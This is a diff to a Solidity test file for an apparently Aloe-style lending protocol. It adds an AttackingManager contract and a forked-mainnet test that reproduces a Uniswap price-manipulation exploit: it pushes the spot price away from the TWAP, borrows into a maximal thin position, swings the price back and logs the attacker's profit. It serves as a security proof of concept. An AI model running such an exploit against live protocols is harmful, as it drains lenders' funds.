@@ -16,6 +16,7 @@ import {
     UNISWAP_AVG_WINDOW
 } from "src/libraries/constants/Constants.sol";
 import {square, mulDiv128} from "src/libraries/MulDiv.sol";
+import {zip} from "src/libraries/Positions.sol";
 import {TickMath} from "src/libraries/TickMath.sol";
 
 import "src/Borrower.sol";
@@ -34,6 +35,25 @@ contract ReenteringManager is IManager {
     }
 }
 
+contract AttackingManager is IManager {
+    function callback(bytes calldata data, address, uint208) external override returns (uint208) {
+        Borrower borrower = Borrower(payable(msg.sender));
+
+        (int24 lower, uint128 liquidity) = abi.decode(data, (int24, uint128));
+
+        borrower.UNISWAP_POOL().mint(msg.sender, lower, lower + 10, liquidity, abi.encode(borrower));
+        return zip([lower, lower + 10, 0, 0, 0, 0]);
+    }
+
+    function uniswapV3MintCallback(uint256 amount0, uint256, bytes calldata data) external {
+        Borrower borrower = abi.decode(data, (Borrower));
+
+        uint256 balance0 = borrower.TOKEN0().balanceOf(address(borrower));
+        borrower.transfer(balance0, 0, msg.sender);
+        borrower.borrow(amount0 - balance0, 0, msg.sender);
+    }
+}
+
 contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
     uint256 constant BLOCK_TIME = 12 seconds;
 
@@ -46,6 +66,9 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
     Lender lender1;
     Borrower impl;
     Borrower account;
+
+    int256[] private _swapAmounts;
+    bool private _recordSwapAmounts;
 
     function setUp() public {
         vm.createSelectFork(vm.rpcUrl("mainnet"), 15_348_451);
@@ -523,8 +546,167 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
     }
 
     /*//////////////////////////////////////////////////////////////
+                         UNISWAP DEPOSIT ATTACK
+    //////////////////////////////////////////////////////////////*/
+
+    function test_uniswapDepositAttack() external {
+        vm.selectFork(0);
+
+        uint160 sqrtPrice1000 = 2.5054144838e33;
+        uint160 sqrtPrice2000 = uint160(vm.envOr("sqrtPrice", uint256(1.7715955711e33)));
+
+        // Start price at $1000 per ETH
+        _manipulateTWAP(300, 13000, true);
+        _swapTo(sqrtPrice1000);
+
+        // Maximize LTV
+        _mockIV(account.ORACLE(), pool, 0);
+
+        {
+            (Prices memory prices, ) = account.getPrices(1 << 32);
+            (uint160 current, , , , , , ) = pool.slot0();
+            console2.log("Initial State ($1000):");
+            console2.log("-> sqrtPrice  TWAP:", prices.c);
+            console2.log("-> sqrtPrice slot0:", current);
+        }
+
+        // Manipulate instantaneous price to $2000 per ETH
+        // (TWAP doesn't change)
+        _recordSwapAmounts = true;
+        _swapTo(sqrtPrice2000);
+        _recordSwapAmounts = false;
+
+        int24 lower;
+        {
+            (Prices memory prices, ) = account.getPrices(1 << 32);
+            (uint160 current, int24 tick, , , , , ) = pool.slot0();
+            console2.log("\nSwapping {1} USDC for {2} WETH to push price to $2000");
+            console2.log("(1) ", _swapAmounts[0] / 1e6);
+            console2.log("(2) ", _swapAmounts[1] / 1e18);
+            console2.log("After 1st Swap:");
+            console2.log("-> sqrtPrice  TWAP:", prices.c);
+            console2.log("-> sqrtPrice slot0:", current);
+            console2.log("-> tick slot0:", tick);
+
+            lower = TickMath.ceil(tick, 10);
+        }
+
+        // Make 10M USDC available for borrowing
+        deal(address(asset0), address(lender0), 10_000_000 * 1e6);
+        lender0.deposit(10_000_000 * 1e6, address(1));
+
+        // Collateralize account with 100k USDC
+        deal(address(asset0), address(account), 100_000 * 1e6);
+        IManager manager = new AttackingManager();
+
+        // Solve for the largest, thinnest Uniswap position possible
+        uint128 L;
+        {
+            uint128 l = 1;
+            uint128 r = 100e18;
+            uint256 snapshot = vm.snapshot();
+
+            for (uint256 i; i < 70; i++) {
+                L = (l + r) / 2;
+
+                bytes memory data = abi.encodeCall(account.modify, (manager, abi.encode(lower, L), 1 << 32));
+                (bool success, ) = address(account).call{value: 0.01 ether}(data);
+
+                if (success) l = L;
+                else r = L;
+                vm.revertTo(snapshot);
+            }
+        }
+
+        // Create the largest, thinnest Uniswap position possible, just below the manipulated tick
+        // --> Prove that this is the maximum amount
+        vm.expectRevert(bytes("Aloe: unhealthy"));
+        account.modify{value: 0.01 ether}(manager, abi.encode(lower, L + 1), 1 << 32);
+        // --> Execute
+        account.modify{value: 0.01 ether}(manager, abi.encode(lower, L + 0), 1 << 32);
+
+        {
+            uint256 borrows0 = account.LENDER0().borrowBalance(address(account));
+            (uint256 current, , , , , , ) = pool.slot0();
+            (uint256 usdc, ) = LiquidityAmounts.getAmountsForLiquidity(
+                uint160(current),
+                TickMath.getSqrtRatioAtTick(lower),
+                TickMath.getSqrtRatioAtTick(lower + 10),
+                L
+            );
+            console2.log("\nBalance Sheet:");
+            console2.log("->", 100_000, "USDC upfront capital");
+            console2.log("->", borrows0 / 1e6, "USDC borrowed");
+            console2.log("->", usdc / 1e6, "USDC in Uniswap position");
+            console2.log("-> Approx. leverage:", 100 + (100 * borrows0) / (100_000 * 1e6), "/ 100");
+        }
+
+        // Manipulate instantaneous price to back to $1000 per ETH
+        // (TWAP doesn't change)
+        _recordSwapAmounts = true;
+        _swapTo(sqrtPrice1000);
+        _recordSwapAmounts = false;
+
+        {
+            (Prices memory prices, ) = account.getPrices(1 << 32);
+            (uint160 current, , , , , , ) = pool.slot0();
+            console2.log("\nSwapping {1} WETH for {2} USDC to push price back to $1000");
+            console2.log("(1) ", _swapAmounts[3] / 1e18);
+            console2.log("(2) ", _swapAmounts[2] / 1e6);
+            console2.log("After 2nd Swap:");
+            console2.log("-> sqrtPrice  TWAP:", prices.c);
+            console2.log("-> sqrtPrice slot0:", current);
+        }
+
+        // If this call succeeds, we know the account is healthy
+        account.modify(this, abi.encode(0, 0, false), 1 << 32);
+
+        {
+            uint256 borrows0 = account.LENDER0().borrowBalance(address(account));
+            (uint256 current, , , , , , ) = pool.slot0();
+            (, uint256 eth) = LiquidityAmounts.getAmountsForLiquidity(
+                uint160(current),
+                TickMath.getSqrtRatioAtTick(lower),
+                TickMath.getSqrtRatioAtTick(lower + 10),
+                L
+            );
+            console2.log("\nBalance Sheet (still healthy!):");
+            console2.log("->", 100_000, "USDC upfront capital");
+            console2.log("->", borrows0 / 1e6, "USDC borrowed");
+            console2.log("->", eth / 1e18, "ETH in Uniswap position");
+
+            current = ((current * current) >> 96) * 1e6;
+
+            int256 swapDiff0 = -_swapAmounts[2] - _swapAmounts[0];
+            int256 swapDiff1 = -_swapAmounts[3] - _swapAmounts[1];
+            console2.log("\nOn their swaps, attacker gained:");
+            console2.log("-> USDC:", swapDiff0 / 1e6);
+            console2.log("-> WETH:", swapDiff1 / 1e18);
+            console2.log("-> (dollar value) ", swapDiff0 / 1e6 + (swapDiff1 * (1 << 96)) / int256(current));
+            console2.log("In their Borrower, attacker gained:");
+            console2.log("-> USDC:", -int256(borrows0 / 1e6 + 100_000));
+            console2.log("-> WETH:", eth / 1e18);
+            console2.log(
+                "-> (dollar value) ",
+                int256((eth << 96) / current) - int256(borrows0 / 1e6 + 100_000)
+            );
+        }
+    }
+
+    /*//////////////////////////////////////////////////////////////
                                 HELPERS
     //////////////////////////////////////////////////////////////*/
+
+    function _swapTo(uint160 sqrtPriceX96) private {
+        (uint160 current, , , , , , ) = pool.slot0();
+        bool upwards = sqrtPriceX96 > current;
+
+        int256 amountIn = upwards ? type(int256).min : type(int256).max;
+        pool.swap(address(this), !upwards, amountIn, sqrtPriceX96, "");
+
+        (current, , , , , , ) = pool.slot0();
+        assertEq(current, sqrtPriceX96);
+    }
 
     /// @dev `k` is the number of blocks to manipulate, and `d` is log(1 + percentChange) / log(1.0001)
     function _manipulateTWAP(uint256 k, uint256 d, bool upwards) private {
@@ -545,7 +727,7 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
         pool.swap(address(this), !upwards, amountIn, sqrtPriceLimit, "");
 
         (, currentTick, , , , , ) = pool.slot0();
-        assertEq(currentTick, targetTick);
+        assertApproxEqAbs(currentTick, targetTick, 1);
 
         vm.roll(nextBlock);
         vm.warp(nextTimestamp);
@@ -578,6 +760,10 @@ contract BorrowerTest is Test, IManager, IUniswapV3SwapCallback {
     //////////////////////////////////////////////////////////////*/
 
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
+        if (_recordSwapAmounts) {
+            _swapAmounts.push(amount0Delta);
+            _swapAmounts.push(amount1Delta);
+        }
         if (amount0Delta > 0) deal(address(asset0), msg.sender, asset0.balanceOf(msg.sender) + uint256(amount0Delta));
         if (amount1Delta > 0) deal(address(asset1), msg.sender, asset1.balanceOf(msg.sender) + uint256(amount1Delta));
     }
